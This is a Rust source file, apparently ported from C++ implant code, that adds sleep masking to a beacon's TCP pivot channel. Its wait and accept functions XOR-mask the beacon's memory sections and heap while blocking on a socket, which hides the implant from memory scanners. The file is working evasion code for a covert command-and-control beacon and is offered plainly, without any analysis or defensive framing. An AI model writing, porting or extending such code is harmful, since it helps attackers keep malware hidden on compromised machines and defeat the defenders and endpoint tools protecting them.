//! Port of gargle_pivot_tcp.cpp — sleep-masking around TCP waits for pivot
//! channels.
//!
//! `GargleWaitTCP` blocks (with the beacon masked) until the peer sends data
//! on the socket; `GargleAccept` performs a blocking `accept` (masked) and
//! returns the new socket. Both only mask when `SETTING_GARGLE_NOOK` is set
//! and no worker threads are running; otherwise they degrade to the plain
//! operations, exactly like the C++.
//!
//! The C++ executed a copied asm trampoline while masked; the Rust port
//! applies the same XOR mask to the same memory ranges (see
//! `crate::gargleint::mask_sections_and_heap`) and blocks directly in
//! `accept`/`recv`.

use crate::beacon::SETTING_GARGLE_NOOK;
use crate::gargleint::{gargle_trampoline, GargleP};
use crate::settings::setting_int;
use crate::state::THREAD_COUNT;
use std::sync::atomic::Ordering;
use std::time::Duration;
use windows_sys::Win32::Networking::WinSock::{
    accept, recv, MSG_PEEK, SOCKADDR, SOCKET, WSAEWOULDBLOCK, WSAGetLastError,
};

/// `GARGLE_TCP_ACTION_RECV` — wait until the peer sends data.
pub const GARGLE_TCP_ACTION_RECV: i32 = 0;
/// `GARGLE_TCP_ACTION_ACCEPT` — wait for an incoming connection.
pub const GARGLE_TCP_ACTION_ACCEPT: i32 = 1;

type AcceptProc = unsafe extern "system" fn(SOCKET, *mut SOCKADDR, *mut i32) -> SOCKET;
type RecvProc = unsafe extern "system" fn(SOCKET, *mut u8, i32, i32) -> i32;

/// `GARGLE_TCP_ARGS` — arguments passed to the TCP mask routine.
///
/// The C++ field `in` is a Rust keyword, so it is ported as `input`.
#[repr(C)]
pub struct GargleTcpArgs {
    /// What to do: [`GARGLE_TCP_ACTION_RECV`] or [`GARGLE_TCP_ACTION_ACCEPT`].
    pub action: i32,
    /// The socket to watch / listen on (C++ `in`).
    pub input: SOCKET,
    /// Result socket for the ACCEPT action (C++ `out`).
    pub out: SOCKET,
    pub accept: AcceptProc,
    pub recv: RecvProc,
}

/// `GARGLEF` for the TCP variant.
type GargleF = fn(&GargleP, &mut GargleTcpArgs);

/// `_gargle_it` — masked TCP wait/accept.
///
/// Masks the beacon data, performs the requested socket operation, then
/// unmasks. The function pointers in `args` mirror the C++ struct; the
/// operations call the Win32 API directly (identical semantics). The RECV
/// action peeks (MSG_PEEK) so the first frame stays in the socket buffer for
/// the channel reader. The ACCEPT action stores the result in `args.out`,
/// exactly like the C++ `return args.out`.
fn gargle_it(parms: &GargleP, args: &mut GargleTcpArgs) {
    crate::gargleint::mask_sections_and_heap(parms);

    match args.action {
        GARGLE_TCP_ACTION_ACCEPT => {
            /* wait for our connection (blocking accept, masked) */
            args.out = unsafe { accept(args.input, std::ptr::null_mut(), std::ptr::null_mut()) };
        }
        _ => {
            /* GARGLE_TCP_ACTION_RECV: wait until the peer sends data */
            let mut buf = [0u8; 1];
            loop {
                let nread = unsafe { recv(args.input, buf.as_mut_ptr(), 1, MSG_PEEK) };
                if nread > 0 {
                    break;
                }
                if nread == 0 {
                    /* the peer closed the connection */
                    break;
                }
                let err = unsafe { WSAGetLastError() };
                if err != WSAEWOULDBLOCK {
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
        }
    }

    crate::gargleint::unmask_sections_and_heap(parms);
}

/// `setup_trampoline2` — one-time trampoline/parameter setup.
fn setup_trampoline2() {
    gargle_trampoline(
        (setup_trampoline2 as fn()) as usize as *mut u8,
        (gargle_it as GargleF) as usize as *mut u8,
    );
}

/// `GargleWaitTCP` — block, with the beacon masked, until the peer sends data
/// on socket `s`. Does nothing when gargle is disabled or worker threads are
/// running (the C++ returns immediately in that case).
pub fn gargle_wait_tcp(s: isize) {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return;
    }

    /* create our trampoline, please */
    setup_trampoline2();

    /* setup our arguments */
    let mut args = GargleTcpArgs {
        action: GARGLE_TCP_ACTION_RECV,
        input: s as SOCKET,
        out: windows_sys::Win32::Networking::WinSock::INVALID_SOCKET,
        accept,
        recv: recv as RecvProc,
    };

    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &mut args);
}

/// `GargleAccept` — accept an incoming connection with the beacon masked, and
/// return the new socket. Falls back to a plain `accept(s, NULL, 0)` when
/// gargle is disabled or worker threads are running.
pub fn gargle_accept(s: isize) -> isize {
    if setting_int(SETTING_GARGLE_NOOK) == 0 || THREAD_COUNT.load(Ordering::SeqCst) > 0 {
        return unsafe { accept(s as SOCKET, std::ptr::null_mut(), std::ptr::null_mut()) } as isize;
    }

    /* create our trampoline, please */
    setup_trampoline2();

    /* setup our arguments */
    let mut args = GargleTcpArgs {
        action: GARGLE_TCP_ACTION_ACCEPT,
        input: s as SOCKET,
        out: windows_sys::Win32::Networking::WinSock::INVALID_SOCKET,
        accept,
        recv: recv as RecvProc,
    };

    /* get the heap sections to mask. */
    crate::gargleint::refresh_heap_records();

    /* call our function */
    let parms = crate::gargleint::gparms();
    gargle_it(&parms, &mut args);

    /* return the out value from our struct */
    args.out as isize
}
